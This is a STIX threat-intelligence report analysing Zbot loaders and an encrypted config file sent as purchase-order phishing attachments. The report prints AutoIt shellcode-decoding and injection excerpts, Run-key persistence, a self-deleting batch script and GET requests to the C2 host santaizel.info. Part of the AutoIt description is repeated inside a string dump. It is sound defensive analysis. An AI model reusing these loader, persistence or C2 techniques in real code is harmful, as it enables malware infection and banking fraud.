stix:STIX_Header.stix:Title: Malware and configuration files associated to Zbot delivered via Purchase Order themed phishing email
stix:STIX_Header.stix:Description:
On April 4, 2013 an email was discovered that contained a suspicious attachment. Malware samples were submitted for analysis. The submitted files "osof.exe" and "Quotation.exe" are both loaders for the same variant of the Zbot malware. This sample calls back to the URL "santaizel.info" via port 80.
The submitted file "config.bin" is an encrypted configuration file downloaded by the Zbot malware. This file contains malicious HTML code and JavaScript written to exploit specific websites.
http://onlinebanking.norisbank.de http://online.lloydstsb.co.uk
This report incorporates data originating from MIFR-286377.

stix:Indicator.indicator:Description:
This is the message that was first observed sending this malicious payload.
-----BEGIN EMAIL HEADERS----- Received: from mail.cantonfairtrading.org.cn ([59.42.254.116]) by [REDACTED] with ESMTP id r34BZTkw010022-r34BZTl0010022 (version=TLSv1 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO) for; Thu, 4 Apr 2013 07:36:03 -0400 Received: from localhost (unknown [127.0.0.1]) by mail.cantonfairtrading.org.cn (Postfix) with ESMTP id 7C46C2C78C5; Thu, 4 Apr 2013 19:35:11 +0800 (CST) MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="=_fe17a8b9f5decc5a1a73c8e486edc90f" Date: Thu, 04 Apr 2013 12:35:11 +0100 From: Fiona Chen <fiona.chen@cantonfairtrading.org.cn> To: undisclosed-recipients:; Subject: Fwd: PURCHASE ORDER,SAMPLE CATALOGUE/DESIGN Message-ID: <18be1db66bacc9682f64f695e8da5a61@cantonfairtrading.org.cn> X-Sender: fiona.chen@cantonfairtrading.org.cn User-Agent: Roundcube Webmail/0.7.2 -----END EMAIL HEADERS-----
This is the file that was attached to the email.

Section Hashes: 1739f8dc6d8b7dfe87fad9f75b549db4 (header) 1024 61ffce4768976fa0dd2a8f6a97b1417a .text 526336 0354bc5f2376b5e9a4a3ba38b682dff1 .rdata 57344 8033f5a38941b4685bc2299e78f31221 .data 26624 94e765ccd959c13fb4c00f9eb5319550 .rsrc 300544
Compile Date: 2012-01-29 21:32:28 UTC
The submitted file is an AutoIt compiled binary file. AutoIt is a freeware BASIC-like scripting language designed for automating the Windows GUI and general purpose scripting.
This file contains embedded shellcode to be decoded and executed at runtime. The shellcode is present in the script section of the file in a series of strings. The strings also contain extraneous characters. Before the code can be executed, these characters are removed and the string is reversed. The resulting strings are concatenated, converted to binary data, loaded into memory and executed. The excerpt below is a portion of the script that contains the encoded strings and the method for decoding as well as the method of execution.
STRING DECODE AND CONCATENATE: $BinaryData = StringReplace(_stringreverse("'9'8'0'1'B'5'B'8'B' ...., "") & StringReplace(_stringreverse("=0=0=A=6=F=F=F=F=B=F= .... "=", "") & StringReplace(_stringreverse("ç0ç0çAç6çFçFçFçFçCçFç .... "ç", "") & StringReplace(_stringreverse(")8)1)9)8)6)6)8)0)9)5) .... ")", "") & StringReplace(_stringreverse("èFèFè0è0è0è0è1è0è4èFè .... "è", "") & StringReplace(_stringreverse("‐F‐F‐C‐F‐8‐A‐5‐B‐F‐F‐ .... "‐", "") & StringReplace(_stringreverse("_C_3_D_9_9_8_F_F_F_F_ .... "_", "") & StringReplace(_stringreverse("éCéFé3é1é5é8éDé8éFéFé .... "é", "") & StringReplace(_stringreverse("àFàFà8àFà2àCà8àEàFàFà .... "à", "") & StringReplace(_stringreverse("'3'C'9'C'3'D'F'F'0'9' .... "'", "")
EXECUTE SHELLCODE: $DllStructure = DllStructCreate(StringReplace("kbkyktkek[k2k0k6k2k]k", "k", "")) //byte(202) DllStructSetData($DllStructure, 1, $BinaryData) $DllGetPtr = DllStructGetPtr($DllStructure) _winapi_callwindowproc($DllGetPtr + 5 + 6 + 7 + 5 + 0 + 5 + 7 + 0 + 4 + 7 + 0 + 70, 0, 0, 0, 0)
The embedded shellcode is responsible for decoding an embedded PE file and executing the file via process injection. Since the PE file is not written to disk it has no significant file name. This memory resident file has the following MD5 hash value: f02f58d28d384ed056beb531bc4c1edb.
-----BEGIN RELEVANT STRING DATA----- This is a compiled AutoIt script. AV researchers please email avsupport@autoitscript.com for support. runas AutoIt v3 edit >>>AUTOIT NO CMDEXECUTE<<< CMDLINERAW CMDLINE /ErrorStdOut /AutoIt3OutputDebug /AutoIt3ExecuteLine /AutoIt3ExecuteScript Software\AutoIt v3\AutoIt au3 #include depth exceeded. Make sure there are no recursive includes Error opening the file Unterminated string #notrayicon #requireadmin #NoAutoIt3Execute #OnAutoItStartRegister #include‐once Cannot parse #include #comments‐start #cs Unterminated group of comments #comments‐end #ce >>>AUTOIT SCRIPT<<< $Id: qmath.h,v 1.1 2004/01/15 19:50:35 jonbennett Exp $ %tEXtdate:create 2012-11-20T09:04:43-06:00 %tEXtdate:modify 2012-11-20T08:59:23-06:00 VS_VERSION_INFO StringFileInfo 040904b0 Comments CompanyName JetAudio, Inc. Compile Date: 2012-01-29 21:32:28 UTC
The submitted file is an AutoIt compiled binary file. AutoIt is a freeware BASIC-like scripting language designed for automating the Windows GUI and general purpose scripting.
This file contains embedded shellcode to be decoded and executed at runtime. The shellcode is present in the script section of the file in a series of strings. The strings also contain extraneous characters. Before the code can be executed, these characters are removed and the string is reversed. The resulting strings are concatenated, converted to binary data, loaded into memory and executed. The excerpt below is a portion of the script that contains the encoded strings and the method for decoding as well as the method of execution.
STRING DECODE AND CONCATENATE: $BinaryData = StringReplace(_stringreverse("'9'8'0'1'B'5'B'8'B' ...., "") & StringReplace(_stringreverse("=0=0=A=6=F=F=F=F=B=F= .... "=", "") & StringReplace(_stringreverse("ç0ç0çAç6çFçFçFçFçCçFç .... "ç", "") & StringReplace(_stringreverse(")8)1)9)8)6)6)8)0)9)5) .... LegalTrademarks OriginalFilename JetAudio.exe PrivateBuild ProductName jetAudio ProductVersion 8, 0, 0, 0 SpecialBuild VarFileInfo Translation VS_VERSION_INFO StringFileInfo 080904b0 FileDescription FileVersion 3, 3, 8, 1 CompiledScript AutoIt v3 Script: 3, 3, 8, 1 VarFileInfo Translation <assembly xmlns="urn:schemas‐microsoft‐com:asm.v1" manifestVersion="1.0"> <trustInfo xmlns="urn:schemas‐microsoft‐com:asm.v3"> <security> <requestedPrivileges> <requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel> </requestedPrivileges> </security> </trustInfo> <dependency> <dependentAssembly> <assemblyIdentity type="win32" name="Microsoft.Windows.Common‐Controls" version="6.0.0.0" language="*" processorArchitecture="*" publicKeyToken="6595b64144ccf1df"></assemblyIdentity> </dependentAssembly> </dependency> </assembly> -----END RELEVANT STRING DATA-----

This is a memory resident (RAM only) file that is spawned from either of the other two files, reported here as osof.exe (MD5: 1c8141a7f5d01308ff6d40fd32f58707) and Quotation.exe (MD5: 76684bddcd36f3a1449a4c205a94e9cc).
Section Hashes: 540baa04601e9fe68a50bf13c99df1b1 (header) 1024 a6efe60002d26721d0e623c9604a9d88 .text 132608 0619ec493ea717cd374c8d2e06bf965a .data 1024 58149325ba186b8a3a272356951cb69c .reloc 6144
This file is a variant of the Zbot malware. This sample is loaded into memory by the loader (Quotation.exe or osof.exe) and executed via process injection. When executed, the malware performs the following actions on the victim host:
A new directory named "Ebuh" is created in the "c:\Documents and Settings\[USER]\Application Data\" directory. A copy of the loader file (Quotation.exe or osof.exe) is dropped into the "Ebuh" directory with the file name "xogy.exe" and is executed.
The loader file is deleted using a batch file (see below).
NOTE: The directory name and the file name used above during execution are not static names. The names change with each iteration of the loader file. The malware injects itself into the Windows system process "explorer.exe". Once running under the Windows system process, the malware performs the following actions:
The following registry keys are queried: Key:HKLM\Software\Microsoft\InternetExplorer\PhishingFilter Key:HKLM\Software\Microsoft\InternetExplorer\Privacy Value: "CleanCookies" Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones\1 Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones\2 Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones\3 Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones\4 Value: "1609", "1406"
The malware calls back to the URL "santaizel.info" via port 80 (see GET request below). The malware code also opens a local port and begins listening. The port used for the listener is not static and changes with each iteration of the malware.
If the configuration file "config.bin" is provided to the malware, additional beaconing begins.
NOTE: The requests use the HTTP standard and are sent via a socket opened by the malware on the victim host.
GOOGLE GET REQUEST: GET /webhp HTTP/1.1 Accept: */* Connection: Close User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: www.google.com Cache-Control: no-cache
The GET request above sent to "google.com" is likely a mechanism for checking the Internet connection of the victim host.
The malware is also responsible for entrenching the dropped file in the registry under the following registry key: KEY: \\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ Value: {AC0F9F7C-A500-6D55-2E20-1399A2F44BF9} Data: "c:\Documents and Settings\[USER]\Application Data\[RANDOM DIRECTORY]\[RANDOM FILE NAME].exe"
A batch file is created in the user's %temp% directory. The purpose of the batch file is to delete the original loader file after execution and then delete itself. The contents of the batch file are displayed below:
@echo off :d del "C:\Documents and Settings\Administrator\Desktop\badfiles\Quotation.exe" if exist "C:\Documents and Settings\Administrator\Desktop\badfiles\Quotation.exe" goto d del /F "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\tmp3cef5780.bat"
ADDITIONAL CONFIGURATION DATA FOUND DURING ANALYSIS: Egixx\ocuxu.exe Uqybi\meuk.aty Ozomul Kueqruwyn Ymop Ruvodako
-----BEGIN RELEVANT STRING DATA----- IsWow64Process "%s" "%s" %s userenv.dll CreateEnvironmentBlock DestroyEnvironmentBlock del "%s" if exist "%s" goto d bat @echo off del /F "%s" /c "%s" ComSpec Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1) HTTP/1.1 POST GET Connection: close urlmon.dll ObtainUserAgentString 0:0 S:(ML;;NRNWNX;;;LW) SeSecurityPrivilege S:(ML;CIOI;NRNWNX;;;LW) cab cabinet.dll FCICreate FCIAddFile FCIFlushCabinet FCIDestroy bcdfghklmnpqrstvwxz aeiouy Global\ Local\ script nbsp; Basic tmp %s%08x.%s %s%08x .exe SeTcbPrivilege SOFTWARE\Microsoft .txt SysListView32 MDIClient CiceroUIWndFrame ConsoleWindowClass #32768 SysShadow FIXME nspr4.dll Host Content-Length http:// NSS layer https:// Referer Content-Type Authorization HTTP/1. Transfer-Encoding chunked Connection close Proxy-Connection identity Accept-Encoding If-Modified-Since .tmp http://www.google.com/webhp SeShutdownPrivilege socks vnc cGlobal\%08X%08X%08X RFB 003.003 RFB GetProcAddress LoadLibraryA .dat 0xF52BE0F5 -----END RELEVANT STRING DATA-----

WinRegistryKeyObj:Value.WinRegistryKeyObj:Name: {AC0F9F7C‐A500‐6D55‐2E20‐1399A2F44BF9}
WinRegistryKeyObj:Value.WinRegistryKeyObj:Data: c:\Documents and Settings\[user]\Application Data\[RANDOM DIRECTORY]\[RANDOM FILENAME].exe

stix:Indicator.indicator:Description:
The submitted file is downloaded by the Zbot malware. This file is encrypted and contains configuration data for the malware to deploy. The following HTML code and JavaScript was extracted from the memory space of a process hijacked by the malware. The data below was likely taken from the decrypted configuration file and loaded into memory. The malware calls back to the URL "santaizel.info" via port 80 (see GET request below). The malware code also opens a local port and begins listening. The port used for the listener is not static and changes with each iteration of the malware.
INITIAL GET REQUEST: GET /css/config.bin HTTP/1.1 Accept: */* Connection: Close User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: santaizel.info Cache-Control: no-cache
If the configuration file "config.bin" is provided to the malware, additional beacons begin.
